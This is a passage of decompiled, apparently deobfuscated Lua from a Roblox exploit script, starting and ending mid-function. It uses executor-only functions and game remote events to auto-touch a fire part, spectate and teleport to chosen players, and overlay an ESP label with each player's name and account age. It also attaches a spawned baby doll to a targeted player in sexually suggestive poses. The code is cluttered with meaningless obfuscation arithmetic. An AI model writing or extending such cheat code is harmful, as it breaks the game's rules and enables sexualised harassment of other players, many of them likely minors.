			while upv1 do
				local localPlayer = game.Players.LocalPlayer
				local humanoidRootPart = (localPlayer.Character or localPlayer.CharacterAdded:Wait()):FindFirstChild("HumanoidRootPart")
				local n001Lots = workspace:FindFirstChild("001_Lots")
				local v = n001Lots and n001Lots:FindFirstChild(localPlayer.Name .. "House")
				local catchFire = v and v:FindFirstChild("HousePickedByPlayer") and v.HousePickedByPlayer:FindFirstChild("HouseModel") and v.HousePickedByPlayer.HouseModel:FindFirstChild("001_BBQ") and v.HousePickedByPlayer.HouseModel["001_BBQ"]:FindFirstChild("CatchFire")

				if catchFire and humanoidRootPart then
					firetouchinterest(humanoidRootPart, catchFire, 0)
					task.wait()
					firetouchinterest(humanoidRootPart, catchFire, 1)
				end

				task.wait(2)
			end
		end)
	end
end

-- payload closure created 138-th (proto #t7388)
local function payload_fn_138(arg)
	local str = ""

	for i = 1, #arg do
		str ..= "҉" .. arg:sub(i, i)
	end

	return str
end

-- payload closure created 139-th (proto #105)
local function payload_fn_139(arg)
	if not arg then
		return ""
	end

	if upv1 == "Gótico" or upv1 == "Gothic" then
		return upv2(arg)
	end

	if upv1 == "Small Caps" or upv1 == "Sᴍᴀʟʟ Cᴀᴘs" or upv1 == "ꜱᴍᴀʟʟ ᴄᴀᴘꜱ" then
		local n2 = 8949178086

		return (arg:gsub("%a", function(arg2)
			local str = arg2:lower()
			if upv3[str] then
				return upv3[str]
			end
			return arg2:upper()
		end))
	end

	if upv1 == "Small Caps (Todas)" or upv1 == "Small Caps (All)" then
		local n2 = 199334793

		return (arg:gsub("%a", function(arg2)
			return upv4[arg2:lower()] or arg2
		end))
	end

	if upv1 == "Small Caps (Alternado)" or upv1 == "Small Caps (Alternated)" or upv1 == "Misto" then
		local flag = true

		return (arg:gsub("%a", function(arg2)
			local str = arg2:lower()
			flag = not flag
			if not flag then
				return arg2:upper()
			end
			return upv4[str] or arg2
		end))
	end

	local v = upv5[upv1]
	if v then
		return (arg:lower():gsub(".", function(arg2)
			return v[arg2] or arg2
		end))
	end
	return arg
end

-- payload closure created 140-th (proto #101)
local function payload_fn_140(arg)
	upv1 = arg
end

-- payload closure created 141-th (proto #102)
local function payload_fn_141(arg)
	upv1 = arg
end

-- payload closure created 142-th (proto #103)
local function payload_fn_142(arg)
	upv1 = arg
end

-- payload closure created 143-th (proto #104)
local function payload_fn_143()
	if upv1 and upv2 ~= "" then
		upv1:FireServer("RolePlayName", upv3(upv2))
	end
end

-- payload closure created 144-th (proto #106)
local function payload_fn_144()
	if upv1 and upv2 ~= "" then
		upv1:FireServer("RolePlayBio", upv3(upv2))
	end
end

-- payload closure created 145-th (proto #107)
local function payload_fn_145()
	local tbl = {}

	for _, player in ipairs(upv1:GetPlayers()) do
		table.insert(tbl, player.Name)
	end

	table.sort(tbl)
	return tbl
end

-- payload closure created 146-th (proto #108)
local function payload_fn_146(arg)
	upv1 = arg or ""

	if upv2 then
		if upv3 then
			upv3:Disconnect()
			upv3 = nil
		end

		if upv4 then
			upv4:Disconnect()
			upv4 = nil
		end

		local flag = upv1 ~= ""

		if flag then
			local v = upv5:FindFirstChild(upv1)

			if v then
				upv2 = true
				local n2 = 8714470687

				local function fn()
					if not upv2 then
						return
					end

					if v and v.Character and v.Character:FindFirstChildOfClass("Humanoid") then
						upv6.CurrentCamera.CameraSubject = v.Character:FindFirstChildOfClass("Humanoid")
					end
				end

				fn()

				upv4 = upv7.Heartbeat:Connect(function()
					pcall(fn)
				end)

				v.CharacterAdded:Connect(function()
					task.wait(0.5)
					pcall(fn)
				end)
			end
		end
	end
end

-- payload closure created 147-th (proto #110)
local function payload_fn_147()
	local n2 = 13310438868

	pcall(function()
		local v = upv1()
		upv2:Set(v)
		local v2 = upv2:Get()

		if v2 and table.find(v, v2) then
			upv2:Set(v2)
			upv3 = v2
		else
			upv2:Set("")
			upv3 = ""
		end
	end)
end

-- payload closure created 148-th (proto #109)
local function payload_fn_148()
	upv1()
end

-- payload closure created 150-th (proto #112)
local function payload_fn_150()
	local n2 = 2692235590
	local n3 = 15380858
	if upv1 == "" then
		return
	end
	local v = upv2:FindFirstChild(upv1)
	if not v or not v.Character or not v.Character:FindFirstChild("HumanoidRootPart") then
		return
	end

	if not upv3.Character or not upv3.Character:FindFirstChild("HumanoidRootPart") then
		return
	end
	local humanoidRootPart = upv3.Character.HumanoidRootPart
	local v2 = upv3
	local v3 = table.pack(bit32.band(n3, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n4 = bit32.band(55234 * v4[1] + bit32.lshift(bit32.band(55234 * bit32.rshift(v3[1], 16) + 8758 * v4[1], 65535), 16), 4294967295) + 4176821578
	local v5 = table.pack(bit32.band(bit32.bor(n3, 502262597), 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(10303 * v6[1] + bit32.lshift(bit32.band(10303 * bit32.rshift(v5[1], 16) + 56777 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.band(n3, 502262597), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n5 = n4 + v7 + bit32.band(10301 * v9[1] + bit32.lshift(bit32.band(10301 * bit32.rshift(v8[1], 16) + 56777 * v9[1], 65535), 16), 4294967295)
	local humanoid = v2.Character:FindFirstChildOfClass("Humanoid")

	for _, descendant in ipairs(upv3.Character:GetDescendants()) do
		if descendant:IsA("BasePart") then
			descendant.Velocity = Vector3.zero
			descendant.RotVelocity = Vector3.zero
			descendant.Anchored = true
		end
	end

	pcall(function()
		humanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 2, 0)
	end)

	if humanoid then
		humanoid.Sit = false
		humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
	end

	task.wait(0.5)

	for _, descendant in ipairs(upv3.Character:GetDescendants()) do
		if descendant:IsA("BasePart") then
			descendant.Anchored = false
			descendant.Velocity = Vector3.zero
			descendant.RotVelocity = Vector3.zero
		end
	end
end

-- payload closure created 151-th (proto #113)
local function payload_fn_151(arg)
	local flag = type(0) == "table"
	local n2 = 4045083898
	local n3 = 3511027089
	upv1 = arg
	local n4 = 228131264

	if not arg then
		if upv2 then
			upv2:Disconnect()
			upv2 = nil
		end

		if upv3.Character and upv3.Character:FindFirstChildOfClass("Humanoid") then
			upv4.CurrentCamera.CameraSubject = upv3.Character:FindFirstChildOfClass("Humanoid")
			local currentCamera = upv4.CurrentCamera
			local cameraType = Enum.CameraType
			local v = bit32.bor(n2, n3)
			currentCamera.CameraType = cameraType.Custom
		end

		return
	end

	if upv5 == "" then
		ViewToggle:Set(false)
		upv1 = false
		return
	end

	local v = table.pack(bit32.band(n4, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local n5 = bit32.band(61971 * v2[1] + bit32.lshift(bit32.band(61971 * bit32.rshift(v[1], 16) + 573 * v2[1], 65535), 16), 4294967295) + 1663657983
	local v3 = table.pack(bit32.band(bit32.bor(n4, 222580709), 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local v5 = bit32.band(7130 * v4[1] + bit32.lshift(bit32.band(7130 * bit32.rshift(v3[1], 16) + 64388 * v4[1], 65535), 16), 4294967295)
	local v6 = table.pack(bit32.band(bit32.bxor(n4, 222580709), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local n6 = n5 + v5 + bit32.band(61972 * v7[1] + bit32.lshift(bit32.band(61972 * bit32.rshift(v6[1], 16) + 573 * v7[1], 65535), 16), 4294967295)
	local v8 = upv6:FindFirstChild(upv5)

	if not v8 or v8 == upv3 then
		ViewToggle:Set(false)
		upv1 = false
		return
	end

	local function fn()
		if not upv1 then
			return
		end

		if v8 and v8.Character and v8.Character:FindFirstChildOfClass("Humanoid") then
			upv4.CurrentCamera.CameraSubject = v8.Character:FindFirstChildOfClass("Humanoid")
		end
	end

	fn()

	upv2 = upv7.Heartbeat:Connect(function()
		pcall(fn)
	end)

	local characterAdded = v8.CharacterAdded

	upv8 = characterAdded:Connect(function()
		task.wait(0.5)
		pcall(fn)
	end)
end

-- payload closure created 152-th (proto #118)
local function payload_fn_152()
	local n2 = 768226426
	local n3 = 1710173387
	local n4 = 1662768197
	if upv1 == "RGB" then
		return Color3.fromHSV(tick() % 5 / 5, 1, 1)
	end

	local tbl = {
		Preto = Color3.new(0, 0, 0),
		Branco = Color3.new(1, 1, 1),
		Vermelho = Color3.new(1, 0, 0),
		Verde = Color3.new(0, 1, 0),
		Azul = Color3.fromRGB(0, 170, 255),
		Amarelo = Color3.new(1, 1, 0),
	}

	local color = Color3.fromRGB
	tbl.Rosa = color(255, 105, 180)
	tbl.Roxo = Color3.fromRGB(128, 0, 128)
	return tbl[upv1] or Color3.new(1, 1, 1)
end

-- payload closure created 153-th (proto #117)
local function payload_fn_153(arg, arg2)
	local n2 = 410618956
	local n3 = 653094646
	local n4 = 3538785312
	if arg == upv1.LocalPlayer then
		return
	end
	local head = arg2:WaitForChild("Head", 10)
	if not head then
		return
	end
	local espStorage = head:FindFirstChild("ESP_Storage")

	if espStorage then
		espStorage:Destroy()
	end

	local billboardGui = Instance.new("BillboardGui")
	local v = upv2
	local v2 = bit32.bxor(n4, 4294967295)
	billboardGui.Name = v
	billboardGui.Parent = head
	billboardGui.Adornee = head
	billboardGui.Size = UDim2.new(0, 200, 0, 50)
	billboardGui.StudsOffset = Vector3.new(0, 3, 0)
	billboardGui.AlwaysOnTop = true
	local textLabel = Instance.new("TextLabel")
	textLabel.Parent = billboardGui
	textLabel.Size = UDim2.new(1, 0, 1, 0)
	textLabel.BackgroundTransparency = 1
	textLabel.TextStrokeTransparency = 0.5
	textLabel.Font = Enum.Font.SourceSansBold
	textLabel.TextSize = 14
	local n5 = n2 + 207640268
	textLabel.Text = arg.Name .. " | " .. arg.AccountAge .. " dias"
	textLabel.TextColor3 = upv3()
	local connection = nil
	local n6 = n5 + 247112900

	connection = upv4.Heartbeat:Connect(function()
		if not upv5 or not textLabel:IsDescendantOf(game) then
			connection:Disconnect()
			return
		end
		textLabel.TextColor3 = upv3()
	end)
end

-- payload closure created 154-th (proto #116)
local function payload_fn_154(arg)
	local n2 = 376768038
	local flag = type(0) == "buffer"
	if upv1[arg] then
		return
	end
	upv1[arg] = {}
	local n3 = n2 + 295682000 - 172808869

	local connection = arg.CharacterAdded:Connect(function(character)
		if upv2 then
			task.wait(0.5)
			upv3(arg, character)
		end
	end)

	table.insert(upv1[arg], connection)

	if arg.Character then
		task.spawn(upv3, arg, arg.Character)
	end
end

-- payload closure created 155-th (proto #114)
local function payload_fn_155(arg)
	upv1 = arg
end

-- payload closure created 156-th (proto #115)
local function payload_fn_156(arg)
	upv1 = arg

	if upv1 then
		for _, player in ipairs(upv2:GetPlayers()) do
			upv3(player)
		end

		upv4.System = upv2.PlayerAdded:Connect(upv3)
	else
		if upv4.System then
			upv4.System:Disconnect()
		end

		for k, v in pairs(upv4) do
			if type(v) == "table" then
				for _, v2 in ipairs(v) do
					v2:Disconnect()
				end
			end

			if k ~= "System" and k.Character then
				local head = k.Character:FindFirstChild("Head")
				local espStorage = head and head:FindFirstChild("ESP_Storage")

				if espStorage then
					espStorage:Destroy()
				end
			end
		end

		upv4 = {}
	end
end

-- payload closure created 159-th (proto #119)
local function payload_fn_159()
	local re = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
	re = re and re:FindFirstChild("1Bab1yFollo1w")

	if re then
		re:FireServer("DeleteFollowCharacter")
	end
end

-- payload closure created 160-th (proto #132)
local function payload_fn_160()
	local followCharacter = workspace:FindFirstChild(upv1.Name)
	followCharacter = followCharacter and followCharacter:FindFirstChild("FollowCharacter")

	if followCharacter and not followCharacter:IsA("Model") then
		followCharacter:Destroy()
		followCharacter = nil
	end

	if followCharacter then
		return true
	end
	local re = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
	re = re and re:FindFirstChild("1Bab1yFollo1w")
	if not re then
		warn("Remote do boneco não foi encontrado.")
		return false
	end
	re:FireServer("CharacterFollowSpawnPlayer", "BabyBoy")
	return true
end

-- payload closure created 161-th (proto #t3969)
local function payload_fn_161()
	if not upv1() then
		return nil, nil
	end
	local n2 = tick() + 5
	local followCharacter

	while true do
		followCharacter = workspace:FindFirstChild(upv2.Name)
		followCharacter = followCharacter and followCharacter:FindFirstChild("FollowCharacter")

		if not (followCharacter and followCharacter:IsA("Model")) then
			task.wait(0.1)
			if not (tick() >= n2) then
				continue
			end
		end

		break
	end

	if not followCharacter or not followCharacter:IsA("Model") then
		warn("O boneco real não carregou a tempo.")
		return nil, nil
	end
	local humanoidRootPart = followCharacter:FindFirstChild("HumanoidRootPart") or followCharacter:FindFirstChild("Torso")
	local humanoid = followCharacter:FindFirstChild("Humanoid")

	if humanoid then
		humanoid.PlatformStand = true
	end

	return followCharacter, humanoidRootPart
end

-- payload closure created 162-th (proto #150)
local function payload_fn_162()
	if upv1 then
		upv1:Disconnect()
		upv1 = nil
	end

	upv2 = false
end

-- payload closure created 163-th (proto #t9409)
local function payload_fn_163()
	local n2 = 3654341311
	local n3 = 726446936
	if not upv1 or not upv2 then
		return false
	end
	local v = upv3:FindFirstChild(upv1)
	if not v then
		return false
	end
	local v2 = upv4()
	if not v2 then
		return false
	end
	local torso = v2:FindFirstChild("Torso") or v2:WaitForChild("Torso", 3)
	local bodyPosition

	if torso then
		bodyPosition = torso:FindFirstChild("BodyPosition") or torso:WaitForChild("BodyPosition", 3)
	else
		bodyPosition = torso
	end

	local bodyGyro

	if torso then
		bodyGyro = torso:FindFirstChild("BodyGyro") or torso:WaitForChild("BodyGyro", 3)
	else
		bodyGyro = torso
	end

	if not torso or not bodyPosition or not bodyGyro then
		warn("A física do Child não carregou.")
		return false
	end

	for _, descendant in ipairs(v2:GetDescendants()) do
		if descendant:IsA("BasePart") then
			descendant.Anchored = false
			descendant.CanCollide = false
		end
	end

	upv5 = true
	local v3 = upv6[upv2]
	local n4 = n3 - 180751840

	upv7 = game:GetService("RunService").Heartbeat:Connect(function()
		local n5 = 3328836983
		local v4 = bit32.bxor(n4, 2586377636)
		if not upv5 then
			return
		end
		v = upv3:FindFirstChild(upv1 or "")
		if not v or not v.Character or not v2.Parent then
			return
		end
		local character = v.Character
		local v5 = character:FindFirstChild(v3)
		local upperTorso

		if not v5 then

			if v3 == "Torso" then
				upperTorso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("HumanoidRootPart")
			elseif v3 == "Left Arm" then
				upperTorso = character:FindFirstChild("LeftUpperArm") or character:FindFirstChild("LeftArm")
			elseif v3 == "Right Arm" then
				upperTorso = character:FindFirstChild("RightUpperArm") or character:FindFirstChild("RightArm")
			elseif v3 == "Left Leg" then
				upperTorso = character:FindFirstChild("LeftLowerLeg") or character:FindFirstChild("LeftLeg")
			elseif v3 ~= "Right Leg" then
				upperTorso = v5
			else
				upperTorso = character:FindFirstChild("RightLowerLeg") or character:FindFirstChild("RightLeg")
			end
		else
			upperTorso = v5
		end

		if not upperTorso then
			return
		end
		bodyPosition.Position = upperTorso.Position
		bodyGyro.CFrame = upperTorso.CFrame
	end)

	return true
end

-- payload closure created 164-th (proto #120)
local function payload_fn_164()
	local tbl = {}

	for _, player in ipairs(upv1:GetPlayers()) do
		table.insert(tbl, player.Name)
	end

	return tbl
end

-- payload closure created 165-th (proto #121)
local function payload_fn_165(arg)
	upv1 = arg
	upv2 = arg
	upv3 = arg

	if upv4 then
		upv5()
		task.wait(0.1)
		upv6()
	end
end

-- payload closure created 166-th (proto #123)
local function payload_fn_166()
	upv1:Set(upv2())
end

-- payload closure created 167-th (proto #122)
local function payload_fn_167()
	pcall(upv1)
end

-- payload closure created 168-th (proto #124)
local function payload_fn_168()
	local n2 = 1108365376
	local n3 = 3674780145
	if not upv1 then
		warn("Nenhum jogador selecionado!")
		return
	end

	if not workspace:FindFirstChild(upv2.Name) or not workspace[upv2.Name]:FindFirstChild("FollowCharacter") then
		local tbl = {}
		local v = bit32.band(n2, 1220929111)
		tbl[1] = "CharacterFollowSpawnPlayer"
		tbl[2] = "BabyBoy"
		local n4 = 270106202

		local ok2, erroAoEnviarBoneco = pcall(function()
			game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(tbl))
		end)

		if not ok2 then
			warn("Erro ao enviar boneco: " .. erroAoEnviarBoneco)
		end

	end

	task.wait(0.2)

	if workspace:FindFirstChild(upv2.Name) then
		for _, child in pairs(workspace[upv2.Name]:GetChildren()) do
			if child:IsA("BasePart") then
				child.CanCollide = true
			end
		end
	end

	local v = upv1

	if workspace:FindFirstChild(v) and workspace:FindFirstChild(upv2.Name) and workspace[upv2.Name]:FindFirstChild("FollowCharacter") then
		workspace[upv2.Name].FollowCharacter.Parent = workspace[v]
		local n4 = 810658819
		if rawget(getgenv(), "RunService") then
			return
		end
		local genv = getgenv()
		local v2 = table.pack(bit32.band(n3, 4294967295))
		local v3 = table.pack(bit32.band(v2[1], 65535))
		local v4 = bit32.band(v3[1] * 15241 + bit32.lshift(bit32.band(v3[1] * 0 + bit32.rshift(v2[1], 16) * 15241, 65535), 16), 4294967295)
		local n5 = n4 - 66969274

		genv.RunService = game:GetService("RunService").Heartbeat:Connect(function()
			local followCharacter = workspace[v]:FindFirstChild("FollowCharacter")

			if followCharacter and followCharacter:FindFirstChild("Torso") and followCharacter.Torso:FindFirstChild("BodyPosition") then
				local humanoidRootPart = workspace[v]:FindFirstChild("HumanoidRootPart")

				if humanoidRootPart then
					followCharacter.Torso.BodyPosition.Position = humanoidRootPart.Position - humanoidRootPart.CFrame.LookVector * 3
					followCharacter.Torso.BodyGyro.CFrame = humanoidRootPart.CFrame
				end
			end
		end)
	end
end

-- payload closure created 169-th (proto #125)
local function payload_fn_169()
	local n2 = 360231914

	if rawget(getgenv(), "RunService") then
		getgenv().RunService:Disconnect()
		getgenv().RunService = nil
	end

	local tbl = {}
	local v = table.pack(bit32.band(n2, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local n3 = bit32.band(24463 * v2[1] + bit32.lshift(bit32.band(24463 * bit32.rshift(v[1], 16) + 10341 * v2[1], 65535), 16), 4294967295) + 294208689
	local v3 = table.pack(bit32.band(bit32.bor(n2, 470611903), 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local v5 = bit32.band(41074 * v4[1] + bit32.lshift(bit32.band(41074 * bit32.rshift(v3[1], 16) + 55194 * v4[1], 65535), 16), 4294967295)
	local v6 = table.pack(bit32.band(bit32.band(n2, 470611903), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local n4 = n3 + v5 + bit32.band(41072 * v7[1] + bit32.lshift(bit32.band(41072 * bit32.rshift(v6[1], 16) + 55194 * v7[1], 65535), 16), 4294967295)
	tbl[1] = "DeleteFollowCharacter"
	local v8 = bit32.bxor(n4, 94544021)

	local ok2, erroAoRetornarBoneco = pcall(function()
		game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(tbl))
	end)

	if not ok2 then
		warn("Erro ao retornar boneco: " .. erroAoRetornarBoneco)
	end

	local tbl2 = { "CharacterFollowSpawnPlayer", "BabyBoy" }

	local ok3, erroAoSpawnarBoneco = pcall(function()
		game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(tbl2))
	end)

	if not ok3 then
		warn("Erro ao spawnar boneco: " .. erroAoSpawnarBoneco)
	end
end

-- payload closure created 172-th (proto #128)
local function payload_fn_172(arg)
	local str = "CurrentCamera"
	local currentCamera = workspace.CurrentCamera

	if arg then
		if not upv1 then
			warn("Nenhum jogador selecionado para Visualizar!")
			return false
		end

		if not rawget(getgenv(), "CameraConnection") then
			local genv = getgenv()
			local RunService = game:GetService("RunService")
			local n2 = 9059974621

			genv.CameraConnection = RunService.Heartbeat:Connect(function()
				local v = upv2:FindFirstChild(upv1)

				if v and v.Character and v.Character:FindFirstChild("Humanoid") then
					currentCamera.CameraSubject = v.Character.Humanoid
				else
					if rawget(getgenv(), "CameraConnection") then
						getgenv().CameraConnection:Disconnect()
						getgenv().CameraConnection = nil
					end

					currentCamera.CameraSubject = upv3.Character and upv3.Character:FindFirstChild("Humanoid") or nil
				end
			end)
		end
	else
		if rawget(getgenv(), "CameraConnection") then
			getgenv().CameraConnection:Disconnect()
			getgenv().CameraConnection = nil
		end

		if upv3.Character and upv3.Character:FindFirstChild("Humanoid") then
			currentCamera.CameraSubject = upv3.Character.Humanoid
		end
	end
end

-- payload closure created 173-th (proto #131)
local function payload_fn_173(arg)
	local value = rawget(getgenv(), arg)

	if value then
		pcall(function()
			value:Disconnect()
		end)

		getgenv()[arg] = nil
	end

	if arg == "ArmConnection" then
		local value2 = rawget(getgenv(), "ArmAnimationTrack")

		if value2 then
			local n2 = 456071601

			pcall(function()
				value2:Stop(0.1)
				value2:Destroy()
			end)

			getgenv().ArmAnimationTrack = nil
		end

		local value3 = rawget(getgenv(), "ArmAnimation")

		if value3 then
			local n2 = 462020241

			pcall(function()
				value3:Destroy()
			end)

			getgenv().ArmAnimation = nil
		end
	end
end

-- payload closure created 174-th (proto #130)
local function payload_fn_174(arg)
	for _, v in ipairs({ "ArmConnection", "BehindSusConnection", "FaceSusConnection" }) do
		if v ~= arg then
			upv1(v)
		end
	end
end

-- payload closure created 175-th (proto #134)
local function payload_fn_175(arg)
	local n2 = tick() + (arg or 5)

	while true do
		local v = workspace:FindFirstChild(upv1.Name)
		local followCharacter = v and v:FindFirstChild("FollowCharacter")

		if followCharacter and followCharacter:FindFirstChild("Torso") then
			local torso = followCharacter.Torso
			if torso:FindFirstChild("BodyPosition") and torso:FindFirstChild("BodyGyro") then
				return followCharacter
			end
		end

		task.wait(0.1)
		if not (n2 <= tick()) then
			continue
		end
		break
	end

	return nil
end

-- payload closure created 176-th (proto #129)
local function payload_fn_176(arg)
	local n1Bab1yFollo1w = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w")

	if arg then
		upv1("ArmConnection")
		pcall(upv2)
		local n2 = 559023681

		task.spawn(function()
			local n3 = 396801976
			local n4 = 945227998
			local n5 = 630804106
			local v = upv3(5)
			if not upv4 then
				return
			end
			local v2 = workspace
			local v3 = v2:FindFirstChild(upv4)
			local rightArm = v and (v:FindFirstChild("Right Arm") or v:WaitForChild("Right Arm", 3))

			if v3 and v3:FindFirstChild("HumanoidRootPart") and v and v:FindFirstChild("Torso") and rightArm then
				local torso = v.Torso
				local n6 = 1.1
				local n7 = -0.6
				local n8 = 82410698
				upv5("ArmConnection")
				local humanoid = v:FindFirstChildOfClass("Humanoid")
				local animator

				if humanoid then
					animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator", 3)
				else
					animator = humanoid
				end

				if animator then
					local animation = Instance.new("Animation")
					animation.Name = "CoquetteArmSus"
					local v4 = bit32.rshift(n5, 24)
					animation.AnimationId = "rbxassetid://72042024"
					animation.Parent = v
					local v5 = animator:LoadAnimation(animation)
					v5.Looped = false
					v5.Priority = Enum.AnimationPriority.Action
					getgenv().ArmAnimation = animation
					local genv = getgenv()
					local n9 = 425344561
					local v6 = bit32.band(n4, 76796321)
					genv.ArmAnimationTrack = v5

					task.spawn(function()
						while rawget(getgenv(), "ArmAnimationTrack") == v5 and v.Parent do
							v5:Play(0)
							v5:AdjustSpeed(0.65)
							v5.TimePosition = 0.6
							local n10 = tick() + 0.4

							while true do
								task.wait(0.03)
								if not (rawget(getgenv(), "ArmAnimationTrack") ~= v5 or not v5.IsPlaying or v5.TimePosition >= 0.65 or tick() >= n10) then
									continue
								end
								break
							end

							if rawget(getgenv(), "ArmAnimationTrack") == v5 then
								v5:Stop(0)
							end
						end
					end)
				else
					warn("Animator do boneco não foi encontrado.")
				end

				getgenv().ArmConnection = game:GetService("RunService").Heartbeat:Connect(function()
					if v3 and v3:FindFirstChild("HumanoidRootPart") then
						local n9 = v3.HumanoidRootPart.CFrame * CFrame.new(0.7, -n6, n7)
						local bodyPosition = torso:FindFirstChild("BodyPosition")
						local bodyGyro = torso:FindFirstChild("BodyGyro")

						if bodyPosition and bodyGyro then
							bodyPosition.Position = n9.Position
							bodyGyro.CFrame = CFrame.new(torso.Position, v3.HumanoidRootPart.Position)
						end
					end
				end)
			elseif v and not rightArm then
				warn("O boneco carregou sem o braço direito. Desative e ative novamente.")
			end
		end)
	else
		local flag = type("1Bab1yFollo1w") == "thread"
		local n2 = 826281083

		pcall(function()
			n1Bab1yFollo1w:FireServer("DeleteFollowCharacter")
		end)

		upv5("ArmConnection")
	end
end

-- payload closure created 179-th (proto #136)
local function payload_fn_179(arg)
	local n1Bab1yFollo1w = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w")

	if arg then
		upv1("BehindSusConnection")
		pcall(upv2)
		local n2 = 554047186

		task.spawn(function()
			local v = upv3(5)
			if not upv4 then
				return
			end
			local v2 = workspace:FindFirstChild(upv4)

			if v2 and v2:FindFirstChild("HumanoidRootPart") and v and v:FindFirstChild("Torso") then
				local n3 = 272346461


				v.Parent = v2
				local torso = v.Torso
				local n4 = 1
				local n5 = 1
				local n6 = 10
				upv5("BehindSusConnection")
				local n7 = n3 + 333072424 - 289752333

				getgenv().BehindSusConnection = game:GetService("RunService").Heartbeat:Connect(function()
					if not torso or not v2:FindFirstChild("HumanoidRootPart") then
						return
					end
					local bodyPosition = torso:FindFirstChild("BodyPosition")
					local bodyGyro = torso:FindFirstChild("BodyGyro")
					if not bodyPosition or not bodyGyro then
						return
					end
					bodyPosition.Position = (v2.HumanoidRootPart.CFrame * CFrame.new(0, -n4, n5 + math.sin(tick() * n6) * 1.5)).Position
					bodyGyro.CFrame = v2.HumanoidRootPart.CFrame
				end)
			end
		end)
	else
		local n2 = 227329212

		pcall(function()
			n1Bab1yFollo1w:FireServer("DeleteFollowCharacter")
		end)

		upv5("BehindSusConnection")
	end
end

-- payload closure created 182-th (proto #139)
local function payload_fn_182(arg)
	local n1Bab1yFollo1w = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w")

	if arg then
		upv1("FaceSusConnection")
		pcall(upv2)
		local n2 = 362263348

		task.spawn(function()
			local v = upv3(5)
			if not upv4 then
				return
			end
			local v2 = workspace:FindFirstChild(upv4)

			if v2 and v2:FindFirstChild("Head") and v and v:FindFirstChild("Torso") then
				v.Parent = v2
				local torso = v.Torso
				upv5("FaceSusConnection")
				local genv = getgenv()
				local RunService = game:GetService("RunService")
				local n3 = 8879766998

				genv.FaceSusConnection = RunService.Heartbeat:Connect(function()
					local n4 = 3403558361
					local v3 = bit32.bxor(n3, 3500807974)
					local n5 = 4003995187
					local head = v2:FindFirstChild("Head")
					if not head or not torso then
						return
					end

					if not torso:FindFirstChild("BodyPosition") or not torso:FindFirstChild("BodyGyro") then
						return
					end
					local n6 = head.CFrame * CFrame.new(0, 0, -1)
					local n7 = math.sin(tick() * 10) * 4
					torso.BodyPosition.Position = n6.Position + head.CFrame.LookVector * n7
					local bodyGyro = torso.BodyGyro
					bodyGyro.CFrame = CFrame.new(torso.Position, head.Position)
				end)
			end
		end)
	else
		local flag = type("1Bab1yFollo1w") == "userdata"
		local n2 = 394756321

		pcall(function()
			n1Bab1yFollo1w:FireServer("DeleteFollowCharacter")
		end)

		upv5("FaceSusConnection")
	end
end

-- payload closure created 185-th (proto #147)
local function payload_fn_185()
	local value = rawget(getgenv(), "ChildAnimationTrack")
	local str = "ChildAnimationTrack"
	getgenv().ChildAnimationTrack = nil

	if value then
		local n2 = 805164906

		pcall(function()
			value:Stop(0.1)
			value:Destroy()
		end)
	end

	local value2 = rawget(getgenv(), "ChildAnimationInstance")
	getgenv().ChildAnimationInstance = nil

	if value2 then
		local n2 = 999300366

		pcall(function()
			value2:Destroy()
		end)
	end
end

-- payload closure created 186-th (proto #145)
local function payload_fn_186()
	local n2 = 502621411
	local n3 = 3818945432
	local character = upv1.Character
	if not character then
		return nil
	end
	local followCharacter = character:FindFirstChild("FollowCharacter")

	if followCharacter and followCharacter:IsA("Model") then
		task.wait(0.2)
		if followCharacter.Parent == character then
			return followCharacter
		end
	end

	local v = upv2 and upv3:FindFirstChild(upv2)
	local followCharacter2 = v and v.Character and v.Character:FindFirstChild("FollowCharacter")

	if followCharacter2 and followCharacter2:IsA("Model") then
		followCharacter2.Parent = character
		task.wait(0.2)
		if followCharacter2.Parent == character then
			return followCharacter2
		end
	end

	for i = 1, 2 do
		upv4()
		local v2 = upv5(5)

		if v2 and v2:IsA("Model") then
			task.wait(0.35)
			if v2.Parent == character then
				return v2
			end
		end
	end

	local v2 = warn
	v2("Não foi possível equipar o boneco.")
	return nil
end

-- payload closure created 187-th (proto #144)
local function payload_fn_187(arg, arg2)
	local n2 = 1258180706
	local n3 = 2465926944
	local match = tostring(arg or ""):match("%d+")
	if not match then
		warn("ID de animação inválido.")
		return false
	end
	local v = upv1()
	if not v then
		return false
	end
	local humanoid = v:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator", 3)
	end

	local v2 = bit32.band(n2, 1635288170)
	if not humanoid then
		warn("Animator do Child não foi encontrado.")
		return false
	end
	upv2()
	local animation = Instance.new("Animation")
	animation.Name = "CoquetteChildAnimation"
	animation.AnimationId = "rbxassetid://" .. match
	animation.Parent = v
	local v3 = humanoid:LoadAnimation(animation)
	v3.Priority = Enum.AnimationPriority.Action
	getgenv().ChildAnimationInstance = animation
	getgenv().ChildAnimationTrack = v3
	arg2 = arg2 or {}
	local n4 = tonumber(arg2.Speed) or 1
	local timePosition = tonumber(arg2.SegmentStart)
	local num = tonumber(arg2.SegmentEnd)
	local v4 = timePosition and num

